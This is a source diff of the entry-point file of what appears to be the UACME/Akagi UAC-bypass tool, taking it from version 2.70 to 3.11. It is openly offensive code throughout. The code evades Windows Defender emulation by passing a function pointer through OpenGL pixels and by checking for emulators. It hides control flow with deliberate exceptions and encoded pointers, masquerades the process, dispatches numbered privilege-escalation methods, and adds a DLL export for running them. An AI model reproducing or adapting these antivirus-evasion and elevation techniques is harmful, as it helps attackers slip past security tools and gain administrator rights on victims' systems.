@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2014 - 2017
+*  (C) COPYRIGHT AUTHORS, 2014 - 2018
 *
 *  TITLE:       MAIN.C
 *
-*  VERSION:     2.70
+*  VERSION:     3.11
 *
-*  DATE:        25 Mar 2017
+*  DATE:        23 Nov 2018
 *
 *  Program entry point.
 *
@@ -22,20 +22,25 @@
 #pragma comment(lib, "opengl32.lib")
 #pragma comment(lib, "comctl32.lib")
 
-UACMECONTEXT g_ctx;
+//Runtime context global variable
+PUACMECONTEXT g_ctx;
+
+//Image Base Address global variable
+HINSTANCE g_hInstance;
+
 TEB_ACTIVE_FRAME_CONTEXT g_fctx = { 0, "(=^..^=)" };
 
-static pfnDecompressPayload pDecryptPayload = NULL;
+static pfnDecompressPayload pDecompressPayload = NULL;
 
 /*
-* DummyWindowProc
+* ucmDummyWindowProc
 *
 * Purpose:
 *
 * Part of antiemulation, does nothing, serves as a window for ogl operations.
 *
 */
-LRESULT CALLBACK DummyWindowProc(
+LRESULT CALLBACK ucmDummyWindowProc(
     HWND hwnd,
     UINT uMsg,
     WPARAM wParam,
@@ -57,18 +62,26 @@ LRESULT CALLBACK DummyWindowProc(
 *
 * Prestart phase with MSE / Windows Defender anti-emulation part.
 *
+* Note:
+*
+* supHeapAlloc unavailable during this routine and calls from it.
+*
 */
 UINT ucmInit(
-    _Inout_ UCM_METHOD *Out
+    _Inout_ UCM_METHOD *RunMethod,
+    _In_reads_or_z_opt_(OptionalParameterLength) LPWSTR OptionalParameter,
+    _In_opt_ ULONG OptionalParameterLength,
+    _In_ BOOL OutputToDebugger
 )
 {
     BOOL        cond = FALSE;
     UCM_METHOD  Method;
     DWORD       Result = ERROR_SUCCESS;
     PVOID       Ptr;
+    LPWSTR      optionalParameter = NULL;
+    ULONG       optionalParameterLength = 0;
     MSG         msg1;
     WNDCLASSEX  wincls;
-    HINSTANCE   inst;
     BOOL        rv = 1;
     HWND        TempWindow;
     HGLRC       ctx;
@@ -79,7 +92,7 @@ UINT ucmInit(
     TOKEN_ELEVATION_TYPE    ElevType;
 #endif	
 
-    ULONG bytesIO, dwType;
+    ULONG bytesIO;
     WCHAR szBuffer[MAX_PATH + 1];
     WCHAR WndClassName[] = TEXT("reirraC");
     WCHAR WndTitleName[] = TEXT("igakA");
@@ -94,9 +107,8 @@ UINT ucmInit(
         PFD_MAIN_PLANE, 0, 0, 0, 0
     };
 
-    *Out = 0;
-
     do {
+
         //we could read this from usershareddata but why not use it
         bytesIO = 0;
         RtlQueryElevationFlags(&bytesIO);
@@ -105,34 +117,31 @@ UINT ucmInit(
             break;
         }
 
-        if (FAILED(CoInitialize(NULL))) {
+        if (FAILED(CoInitializeEx(NULL, COINIT_APARTMENTTHREADED))) {
             Result = ERROR_INTERNAL_ERROR;
             break;
         }
 
         InitCommonControls();
 
-        //fill common data block
-        RtlSecureZeroMemory(&g_ctx, sizeof(g_ctx));
+        if (g_hInstance == NULL)
+            g_hInstance = (HINSTANCE)NtCurrentPeb()->ImageBaseAddress;
 
-        g_ctx.ucmHeap = RtlCreateHeap(HEAP_GROWABLE, NULL, 0, 0, NULL, NULL);
-        if (g_ctx.ucmHeap == NULL) {
-            Result = ERROR_NOT_ENOUGH_MEMORY;
-            break;
+        if (*RunMethod == UacMethodInvalid) {
+
+            bytesIO = 0;
+            RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
+            GetCommandLineParam(GetCommandLine(), 1, szBuffer, MAX_PATH, &bytesIO);
+            if (bytesIO == 0)
+                return ERROR_BAD_ARGUMENTS;
+
+            Method = (UCM_METHOD)strtoul(szBuffer);
+            *RunMethod = Method;
+
         }
-
-        g_ctx.AkagiFlag = AKAGI_FLAG_KILO;
-        inst = NtCurrentPeb()->ImageBaseAddress;
-
-        dwType = 0;
-        bytesIO = 0;
-        RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
-        GetCommandLineParam(GetCommandLine(), 1, szBuffer, MAX_PATH, &bytesIO);
-        if (bytesIO == 0)
-            return ERROR_BAD_ARGUMENTS;
-
-        Method = strtoul(szBuffer);
-        *Out = Method;
+        else {
+            Method = *RunMethod;
+        }
 
 #ifndef _DEBUG
         if (Method == UacMethodTest)
@@ -141,9 +150,6 @@ UINT ucmInit(
         if (Method >= UacMethodMax)
             return ERROR_BAD_ARGUMENTS;
 
-        if (Method == UacMethodSXS)
-            g_ctx.AkagiFlag = AKAGI_FLAG_TANGO;
-
 #ifndef _DEBUG
         ElevType = TokenElevationTypeDefault;
         if (supGetElevationType(&ElevType)) {
@@ -151,24 +157,37 @@ UINT ucmInit(
                 return ERROR_UNSUPPORTED_TYPE;
             }
         }
+        else {
+            Result = ERROR_INTERNAL_ERROR;
+            break;
+        }
 #endif
+
         //
         // Process optional parameter.
         //
-        RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
-        bytesIO = 0;
-        GetCommandLineParam(GetCommandLine(), 2, szBuffer, MAX_PATH, &bytesIO);
-        if (bytesIO > 0) {
-            g_ctx.OptionalParameterLength = bytesIO;
-            _strcpy(g_ctx.szOptionalParameter, szBuffer);
+        if ((OptionalParameter == NULL) || (OptionalParameterLength == 0)) {
+
+            RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
+            bytesIO = 0;
+            GetCommandLineParam(GetCommandLine(), 2, szBuffer, MAX_PATH, &bytesIO);
+            if (bytesIO > 0) {
+                optionalParameter = (LPWSTR)&szBuffer;
+                optionalParameterLength = bytesIO;
+            }
+
+        }
+        else {
+            optionalParameter = OptionalParameter;
+            optionalParameterLength = OptionalParameterLength;
         }
 
         wincls.cbSize = sizeof(WNDCLASSEX);
         wincls.style = CS_OWNDC;
-        wincls.lpfnWndProc = &DummyWindowProc;
+        wincls.lpfnWndProc = &ucmDummyWindowProc;
         wincls.cbClsExtra = 0;
         wincls.cbWndExtra = 0;
-        wincls.hInstance = inst;
+        wincls.hInstance = g_hInstance;
         wincls.hIcon = NULL;
         wincls.hCursor = (HCURSOR)LoadImage(NULL, MAKEINTRESOURCE(OCR_NORMAL), IMAGE_CURSOR, 0, 0, LR_SHARED);
         wincls.hbrBackground = NULL;
@@ -178,55 +197,11 @@ UINT ucmInit(
         RegisterClassEx(&wincls);
 
         TempWindow = CreateWindowEx(WS_EX_TOPMOST, WndClassName, WndTitleName,
-            WS_VISIBLE | WS_POPUP | WS_CLIPCHILDREN | WS_CLIPSIBLINGS, 0, 0, 30, 30, NULL, NULL, inst, NULL);
+            WS_VISIBLE | WS_POPUP | WS_CLIPCHILDREN | WS_CLIPSIBLINGS, 0, 0, 30, 30, NULL, NULL, g_hInstance, NULL);
 
-        //remember dll handles
-        g_ctx.hKernel32 = GetModuleHandleW(KERNEL32_DLL);
-        if (g_ctx.hKernel32 == NULL) {
-            Result = ERROR_INVALID_HANDLE;
-            break;
-        }
-
-        g_ctx.hOle32 = GetModuleHandleW(OLE32_DLL);
-        if (g_ctx.hOle32 == NULL) {
-            g_ctx.hOle32 = LoadLibraryW(OLE32_DLL);
-            if (g_ctx.hOle32 == NULL) {
-                Result = ERROR_INVALID_HANDLE;
-                break;
-            }
-        }
-        g_ctx.hShell32 = GetModuleHandleW(SHELL32_DLL);
-        if (g_ctx.hShell32 == NULL) {
-            g_ctx.hShell32 = LoadLibraryW(SHELL32_DLL);
-            if (g_ctx.hShell32 == NULL) {
-                Result = ERROR_INVALID_HANDLE;
-                break;
-            }
-        }
-
-        //query basic directories
-        supExpandEnvironmentStrings(L"%systemroot%\\system32\\", g_ctx.szSystemDirectory, MAX_PATH);
-        supExpandEnvironmentStrings(L"%temp%\\", g_ctx.szTempDirectory, MAX_PATH);
-
-        //query build number
-        RtlGetNtVersionNumbers(NULL, NULL, &g_ctx.dwBuildNumber);
-        g_ctx.dwBuildNumber &= 0x00003fff;
-
-        if (g_ctx.dwBuildNumber < 7000) {
-            Result = ERROR_INSTALL_PLATFORM_UNSUPPORTED;
-            break;
-        }
-
-        g_ctx.IsWow64 = supIsProcess32bit(GetCurrentProcess());
-
-        if (g_ctx.dwBuildNumber > 14997) {
-            g_ctx.IFileOperationFlags = FOF_NOCONFIRMATION | FOFX_NOCOPYHOOKS | FOFX_REQUIREELEVATION;
-        }
-        else {
-            g_ctx.IFileOperationFlags = FOF_NOCONFIRMATION | FOF_SILENT | FOFX_SHOWELEVATIONPROMPT | FOFX_NOCOPYHOOKS | FOFX_REQUIREELEVATION;
-        }
-
-        //flashes and sparks
+        //
+        // Flashes and sparks.
+        //
         dc1 = GetDC(TempWindow);
         index = ChoosePixelFormat(dc1, &pfd);
         SetPixelFormat(dc1, index, &pfd);
@@ -246,13 +221,13 @@ UINT ucmInit(
 #pragma warning(disable: 4054)//code to data
         Ptr = (PVOID)&DecompressPayload;
 #pragma warning(pop)
-        pDecryptPayload = NULL;
+        pDecompressPayload = NULL;
 #ifdef _WIN64
         glDrawPixels(2, 1, GL_RGBA, GL_UNSIGNED_BYTE, &Ptr);
-        glReadPixels(0, 0, 2, 1, GL_RGBA, GL_UNSIGNED_BYTE, (GLvoid *)&pDecryptPayload);
+        glReadPixels(0, 0, 2, 1, GL_RGBA, GL_UNSIGNED_BYTE, (GLvoid *)&pDecompressPayload);
 #else
         glDrawPixels(1, 1, GL_RGBA, GL_UNSIGNED_BYTE, &Ptr);
-        glReadPixels(0, 0, 1, 1, GL_RGBA, GL_UNSIGNED_BYTE, (GLvoid *)&pDecryptPayload);
+        glReadPixels(0, 0, 1, 1, GL_RGBA, GL_UNSIGNED_BYTE, (GLvoid *)&pDecompressPayload);
 #endif
         SwapBuffers(dc1);
         SendMessage(TempWindow, WM_CLOSE, 0, 0);
@@ -267,11 +242,20 @@ UINT ucmInit(
             DispatchMessage(&msg1);
         } while (rv != 0);
 
-        UnregisterClass(WndClassName, inst);
+        UnregisterClass(WndClassName, g_hInstance);
 
-        g_ctx.DecryptRoutine = pDecryptPayload;
+        g_ctx = (PUACMECONTEXT)supCreateUacmeContext(Method,
+            optionalParameter,
+            optionalParameterLength,
+            pDecompressPayload,
+            OutputToDebugger);
+
 
     } while (cond);
+
+    if (g_ctx == NULL) {
+        Result = ERROR_FATAL_APP_EXIT;
+    }
 
     return Result;
 }
@@ -284,71 +268,178 @@ UINT ucmInit(
 * Program entry point.
 *
 */
-UINT ucmMain()
+UINT ucmMain(
+    _In_opt_ UCM_METHOD Method,
+    _In_reads_or_z_opt_(OptionalParameterLength) LPWSTR OptionalParameter,
+    _In_opt_ ULONG OptionalParameterLength,
+    _In_ BOOL OutputToDebugger
+)
 {
     UINT        uResult;
-    UCM_METHOD  Method = 0;
+    UCM_METHOD  method = Method;
 
-    supCheckMSEngineVFS();
+    wdCheckEmulatedVFS();
 
-    uResult = ucmInit(&Method);
+    uResult = ucmInit(&method,
+        OptionalParameter,
+        OptionalParameterLength,
+        OutputToDebugger);
+
     switch (uResult) {
 
     case ERROR_ELEVATION_REQUIRED:
-        ucmShowMessage(TEXT("Please enable UAC for this account."));
+        ucmShowMessage(OutputToDebugger, TEXT("Please enable UAC for this account."));
         break;
 
     case ERROR_UNSUPPORTED_TYPE:
-        ucmShowMessage(TEXT("Admin account with limited token required."));
+        ucmShowMessage(OutputToDebugger, TEXT("Admin account with limited token required."));
         break;
 
     case ERROR_INSTALL_PLATFORM_UNSUPPORTED:
-        ucmShowMessage(TEXT("This Windows version is not supported."));
+        ucmShowMessage(OutputToDebugger, TEXT("This Windows version is not supported."));
         break;
 
     case ERROR_BAD_ARGUMENTS:
-        ucmShowMessage(TEXT("Usage: Akagi.exe [Method] [OptionalParamToExecute]"));
+        ucmShowMessage(OutputToDebugger, T_USAGE_HELP);
         break;
     default:
         break;
 
     }
+
     if (uResult != ERROR_SUCCESS) {
         return ERROR_INTERNAL_ERROR;
     }
 
-    supMasqueradeProcess();
+    supMasqueradeProcess(FALSE);
 
-    if (MethodsManagerCall(Method))
+    if (MethodsManagerCall(method))
         return ERROR_SUCCESS;
     else
         return GetLastError();
 }
 
-DWORD g_ExCookie = 0;
-
-LONG NTAPI ucmVehHandler(
-    EXCEPTION_POINTERS *ExceptionInfo
+/*
+* ucmSehHandler
+*
+* Purpose:
+*
+* Program entry point seh handler, indirect control passing.
+*
+*/
+INT ucmSehHandler(
+    _In_ UINT ExceptionCode,
+    _In_ EXCEPTION_POINTERS *ExceptionInfo
 )
 {
     UACME_THREAD_CONTEXT *uctx;
 
-    if (ExceptionInfo->ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP)
-        if (ExceptionInfo->ExceptionRecord->ExceptionFlags == g_ExCookie) {
-            uctx = (UACME_THREAD_CONTEXT*)RtlGetFrame();
-            while ((uctx != NULL) && (uctx->Frame.Context != &g_fctx)) {
-                uctx = (UACME_THREAD_CONTEXT *)uctx->Frame.Previous;
-            }
-            if (uctx) {
-                if (uctx->ucmMain)
-                    uctx->ReturnedResult = uctx->ucmMain();
-            }
-            ExceptionInfo->ContextRecord->EFlags |= 0x10000;
-            return EXCEPTION_CONTINUE_EXECUTION;
+    UNREFERENCED_PARAMETER(ExceptionInfo);
+
+    if (ExceptionCode == STATUS_INTEGER_DIVIDE_BY_ZERO) {
+        uctx = (UACME_THREAD_CONTEXT*)RtlGetFrame();
+        while ((uctx != NULL) && (uctx->Frame.Context != &g_fctx)) {
+            uctx = (UACME_THREAD_CONTEXT *)uctx->Frame.Previous;
         }
+        if (uctx) {
+            if (uctx->ucmMain) {
+                uctx->ucmMain = (pfnEntryPoint)supDecodePointer(uctx->ucmMain);
+                
+                uctx->ReturnedResult = uctx->ucmMain(UacMethodInvalid, 
+                    NULL, 
+                    0, 
+                    FALSE);
+            }
+        }
+        return EXCEPTION_EXECUTE_HANDLER;
+    }
     return EXCEPTION_CONTINUE_SEARCH;
 }
 
+#undef COMPILE_AS_DLL
+
+typedef struct _CALLEE_PARAMS {
+    UCM_METHOD Method;
+    LPWSTR OptionalParameter;
+    ULONG OptionalParameterLength;
+    BOOL OutputToDebugger;
+} CALLEE_PARAMS, *PCALLEE_PARAMS;
+
+/*
+* ucmCalleeThread
+*
+* Purpose:
+*
+* Worker thread, mostly for COM.
+*
+*/
+DWORD WINAPI ucmCalleeThread(_In_ LPVOID lpParameter)
+{
+    CALLEE_PARAMS *Params = (PCALLEE_PARAMS)lpParameter;   
+
+    ExitThread(ucmMain(Params->Method,
+        Params->OptionalParameter,
+        Params->OptionalParameterLength,
+        Params->OutputToDebugger));
+}
+
+/*
+* ucmRunMethod
+*
+* Purpose:
+*
+* Dll only export.
+*
+*/
+ULONG WINAPI ucmRunMethod(
+    _In_ UCM_METHOD Method,
+    _In_reads_or_z_opt_(OptionalParameterLength) LPWSTR OptionalParameter,
+    _In_ ULONG OptionalParameterLength,
+    _In_ BOOL OutputToDebugger
+)
+{
+#ifdef COMPILE_AS_DLL
+    HANDLE hCalleeThread;
+    DWORD ThreadId, ExitCode = 0;
+    CALLEE_PARAMS Params;
+
+    if (wdIsEmulatorPresent2()) {
+        RtlRaiseStatus(STATUS_TRUST_FAILURE);
+    }
+
+    if (wdIsEmulatorPresent() == STATUS_NOT_SUPPORTED) {
+
+        Params.Method = Method;
+        Params.OptionalParameter = OptionalParameter;
+        Params.OptionalParameterLength = OptionalParameterLength;
+        Params.OutputToDebugger = OutputToDebugger;
+
+        hCalleeThread = CreateThread(NULL,
+            0,
+            (LPTHREAD_START_ROUTINE)ucmCalleeThread,
+            &Params,
+            0,
+            &ThreadId);
+
+        if (hCalleeThread) {
+            WaitForSingleObject(hCalleeThread, INFINITE);
+            GetExitCodeThread(hCalleeThread, &ExitCode);
+            CloseHandle(hCalleeThread);
+            return ExitCode;
+        }
+
+    }
+    return ERROR_ACCESS_DENIED;
+#else
+    UNREFERENCED_PARAMETER(Method);
+    UNREFERENCED_PARAMETER(OptionalParameter);
+    UNREFERENCED_PARAMETER(OptionalParameterLength);
+    UNREFERENCED_PARAMETER(OutputToDebugger);
+    return ERROR_NOT_SUPPORTED;
+#endif
+}
+
+#ifndef COMPILE_AS_DLL
 /*
 * main
 *
@@ -357,32 +448,60 @@ LONG NTAPI ucmVehHandler(
 * Program entry point.
 *
 */
+#pragma comment(linker, "/ENTRY:main")
 VOID main()
 {
-    PVOID ExceptionHandler;
-    DWORD k;
-    EXCEPTION_RECORD ex;
+    int v = 1, d = 0;
     UACME_THREAD_CONTEXT uctx;
 
     RtlSecureZeroMemory(&uctx, sizeof(uctx));
 
-    ExceptionHandler = RtlAddVectoredExceptionHandler(1, &ucmVehHandler);
-    if (ExceptionHandler) {
+    if (wdIsEmulatorPresent() == STATUS_NOT_SUPPORTED) {
+
         uctx.Frame.Context = &g_fctx;
-        uctx.ucmMain = (pfnEntryPoint)ucmMain;
+        uctx.ucmMain = (pfnEntryPoint)supEncodePointer(ucmMain);
         RtlPushFrame((PTEB_ACTIVE_FRAME)&uctx);
 
-#pragma warning(suppress: 28159)
-        k = ~GetTickCount();
-        g_ExCookie = RtlRandomEx(&k);
+        __try {
+            v = (int)USER_SHARED_DATA->NtProductType;
+            d = (int)USER_SHARED_DATA->AlternativeArchitecture;
+            v = (int)(v / d);
+        }
+        __except (ucmSehHandler(GetExceptionCode(), GetExceptionInformation())) {
+            v = 1;
+        }
 
-        RtlSecureZeroMemory(&ex, sizeof(ex));
-        ex.ExceptionFlags = g_ExCookie;
-        ex.ExceptionCode = (DWORD)STATUS_SINGLE_STEP;
-        RtlRaiseException(&ex);
-
-        RtlRemoveVectoredExceptionHandler(ExceptionHandler);
         RtlPopFrame((PTEB_ACTIVE_FRAME)&uctx);
     }
-    ExitProcess(uctx.ReturnedResult);
+    if (v > 0)
+        ExitProcess(uctx.ReturnedResult);
 }
+
+#else
+
+/*
+* DllMain
+*
+* Purpose:
+*
+* Dll entry point.
+*
+*/
+#pragma comment(linker, "/DLL /ENTRY:DllMain")
+BOOL WINAPI DllMain(
+    _In_ HINSTANCE hinstDLL,
+    _In_ DWORD fdwReason,
+    _In_ LPVOID lpvReserved
+)
+{
+    UNREFERENCED_PARAMETER(lpvReserved);
+
+    if (fdwReason == DLL_PROCESS_ATTACH) {
+        LdrDisableThreadCalloutsForDll(hinstDLL);
+        g_hInstance = hinstDLL;
+    }
+
+    return TRUE;
+}
+
+#endif //COMPILE_AS_DLL
